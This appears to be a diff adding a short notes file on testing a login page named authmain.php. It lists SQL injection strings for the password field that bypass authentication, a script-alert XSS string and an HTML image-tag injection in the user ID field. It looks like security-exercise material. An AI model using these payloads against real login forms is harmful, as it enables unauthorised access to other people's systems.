@@ -1,0 +1,19 @@
+authmain.php --> SQL Injection
+==============================
+
+UserID: somebody
+
+Password: p') or 1 = '1' #
+
+
+UserID: <script>alert("xss")</script>
+
+Password: p') or 1 = '1' #
+
+
+UserID: <img src="https://www.incibe.es/sites/default/files/paginas/aprendeciberseguridad/portada.jpg">
+
+Password: p') or true #
+
+
+
